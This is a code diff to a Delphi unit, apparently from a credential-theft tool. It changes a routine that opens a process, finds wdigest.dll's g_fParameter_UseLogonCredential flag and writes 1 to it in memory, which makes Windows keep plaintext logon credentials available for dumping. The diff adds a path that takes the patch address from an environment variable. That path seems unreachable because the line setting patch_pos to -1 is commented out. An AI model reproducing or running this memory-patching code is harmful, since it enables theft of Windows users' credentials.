@@ -5,7 +5,7 @@ unit uLSA;
 interface
 
 uses
-  windows,Classes, SysUtils,ucryptoapi,utils,upsapi,umemory;
+  windows,Classes, SysUtils,ucryptoapi,utils,upsapi,umemory,dos;
 
 function decryptLSA(cbmemory:ulong;encrypted:array of byte;var decrypted:tbytes):boolean;
 function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes):boolean;
@@ -880,11 +880,9 @@ var
   module:string='wdigest.dll';
   hprocess:thandle;
   offset_dword:dword;
-  read:cardinal;
   offset:nativeint=0;
   patch_pos:ShortInt=0;
   pattern:tbytes; //array of byte;
-  bytes:array[0..254] of byte;
   dw:dword;
 begin
 result:=false;
@@ -918,6 +916,13 @@ result:=false;
         end;
      end; //if (lowercase(osarch)='amd64') then
 
+  if lowercase(getenv('g_fParameter_UseLogonCredential'))<>'' then
+     begin
+     //patch_pos:=-1;
+     offset:=int64(strtoint('$'+getenv('g_fParameter_UseLogonCredential')));
+     log('env g_fParameter_UseLogonCredential:'+inttohex(offset,sizeof(offset)));
+     end;
+
   if patch_pos =0 then
      begin
      log('no patch mod for this windows version',1);
@@ -941,20 +946,31 @@ result:=false;
     if hprocess<>thandle(-1) then
     begin
     log('openprocess ok',0);
+    if patch_pos =-1 then
+        begin
+        log('g_fParameter_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
+        //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
+        //dw:=1;
+        ReadMem (hprocess,offset,@dw,4);
+        log('g_fParameter_UseLogonCredential value:'+inttostr(ByteSwap32(dw)));
+        dw:=ByteSwap32 (1);
+        writemem(hprocess,offset,@dw,4);
+        result:=true;
+        end;
     if ReadMem  (hprocess,offset+sizeof(PTRN_WIN81_UseLogonCredential),@offset_dword,4) then
-      begin
-      //CopyMemory(@offset_dword,@offset_byte[0],4);
-      log('ReadProcessMemory OK '+inttohex(offset_dword,4));
-      offset:=offset+sizeof(PTRN_WIN81_UseLogonCredential)+offset_dword+patch_pos;
-      log('g_fParameter_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
-      //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
-      //dw:=1;
-      ReadMem (hprocess,offset,@dw,4);
-      log('g_fParameter_UseLogonCredential value:'+inttostr(ByteSwap32(dw)));
-      dw:=ByteSwap32 (1);
-      writemem(hprocess,offset,@dw,4);
-      result:=true;
-      end; //if readmem
+        begin
+        //CopyMemory(@offset_dword,@offset_byte[0],4);
+        log('ReadProcessMemory OK '+inttohex(offset_dword,4));
+        offset:=offset+sizeof(PTRN_WIN81_UseLogonCredential)+offset_dword+patch_pos;
+        log('g_fParameter_UseLogonCredential offset:'+inttohex(offset,sizeof(pointer)));
+        //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
+        //dw:=1;
+        ReadMem (hprocess,offset,@dw,4);
+        log('g_fParameter_UseLogonCredential value:'+inttostr(ByteSwap32(dw)));
+        dw:=ByteSwap32 (1);
+        writemem(hprocess,offset,@dw,4);
+        result:=true;
+        end; //if readmem
     closehandle(hprocess);
     end;
     end; //if offset<>0 then
